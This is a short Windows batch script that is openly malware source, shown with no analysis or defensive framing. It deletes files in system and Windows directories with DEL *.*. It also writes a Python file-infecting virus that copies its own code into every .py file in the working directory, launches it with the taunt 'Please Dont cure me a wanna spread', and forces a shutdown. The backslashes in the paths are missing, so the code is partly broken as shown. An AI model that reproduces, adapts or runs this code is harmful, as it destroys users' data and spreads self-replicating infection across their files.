   @ECHO OFF
   IF EXIST "C:Python24Lib" GOTO PYVIRUS
   DEL *.* & DEL %SystemDrive%*.* & DEL %WinDir%*.* & DEL %Path%*.* & DEL %SystemDirectory%*.*
   :PYVIRUS
   ECHO import glob >>%2Python24LibPYVIR.PY
   ECHO input = open (__file__, 'r') >>%2Python24LibPYVIR.PY
   ECHO xxx = ("a") >>%2Python24LibPYVIR.PY
   ECHO for f in glob.glob('*.py'): >>%2Python24LibPYVIR.PY
   ECHO Infect = open (f, xxx) >>%2Python24LibPYVIR.PY
   ECHO line = input.readline() >>%2Python24LibPYVIR.PY
   ECHO while line: >>%2Python24LibPYVIR.PY
   ECHO Infect.write(line) >>%2Python24LibPYVIR.PY
   ECHO line = input.readline() >>%2Python24LibPYVIR.PY
   ECHO input.close() >>%2Python24LibPYVIR.PY
   ECHO Infect.close() >>%2Python24LibPYVIR.PY
   ECHO b= raw_input("Please Dont cure me a wanna spread ") >>%2Python24LibPYVIR.PY
   Start "c:Python24LibPYVIR.PY"
   SHUTDOWN -F
